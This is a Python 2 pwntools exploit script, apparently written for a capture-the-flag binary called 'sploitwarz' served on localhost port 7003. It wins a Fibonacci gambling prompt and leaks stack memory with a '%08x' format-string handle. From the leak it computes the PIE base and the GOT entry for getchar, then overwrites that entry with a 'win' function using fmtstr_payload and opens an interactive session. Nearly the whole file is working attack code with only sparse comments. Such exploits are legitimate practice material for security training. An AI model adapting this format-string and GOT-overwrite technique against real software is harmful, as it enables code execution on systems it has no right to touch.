#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./sploitwarz --host localhost --port 7003
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./sploitwarz')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 7003)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x5655718a
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments
'''
0x5655718a #getchar after memory processing
0x56557182 #printf after leak
break *0x56557124 #leak line
break *0x5655709f #leaked address
break *0x5655673b #run_game
break *0x565560f0 #addres of putchar
'''
def is_fibonacci(n):
    phi = 0.5 + 0.5 * math.sqrt(5.0)
    a = phi * n
    return n == 0 or abs(round(a) - a) < 1.0 / n

def run_game(io, handle):
	io.recvuntil('handle?')
	io.sendline(handle)

def gamble(io, capture_memory):
	line1 = io.recvuntil('do?')
	line2 = io.sendline('g')
	line3 = io.recvuntil('):')
	print line3
	coins = line3[len('How much bitcoin do you wish to gamble? (max ')+2:-2]
	print 'Gambling: '+coins+' coins'
	io.sendline(coins)
	line4 = io.recvuntil('out:')
	print line4
	nb = [];
	emptyline = io.recvline()
	correct_val = -1
	for i in range(5):
		val = io.recvline()
		print val
		m = re.match(r'\d\)\s(\d+)',val)
		nb = int(m.group(1))
		print is_fibonacci(nb)
		if(is_fibonacci(nb) == False):
			correct_val = i+1

	if(correct_val != -1):
		print str(correct_val)
		io.sendline(str(correct_val))
	else:
		print "Error at fibo"
		exit(1)
	line5 = io.recvuntil('succubus.')
	print line5
	mem = ''
	if(capture_memory):
		dump = line5.split(' ')[3]
		mem = dump.split('.')[3]
		line6 = io.recvline()
		line7 = io.recvline()
		io.sendline()
		return mem
	#print mem




		#nb.append()

def change_handle(io,payload):
	line1 = io.recvuntil('do?')
	print line1
	io.sendline('c')
	io.recvuntil('handle?')
	io.sendline(payload)

io = start()
handle = 'a'*4+'.%08x'*20
#OFFSET = 9
'''
memory OFFSET
win 0x155c
main 0x2326
got getchar ebx + 0x14
leakedAddress - 0x209f = baseAddress
ebx ebx - raw_address = 0x2c09
'''
run_game(io,handle)
#fmtstr_payload(9,{0x56559ce0:})
leakedMemory = gamble(io, True)

baseAddress = int(leakedMemory,16) - int('0x209f',16)
ebx = int(leakedMemory,16) + int('0x2c09',16)
getchar = ebx + int('0x14',16)
win = baseAddress + int('0x155c',16)
print win
print getchar
payload = fmtstr_payload(9, {getchar:win},0,'byte')
#payload ='%x%x'
#print payload
change_handle(io,payload)
gamble(io, False)
io.interactive()
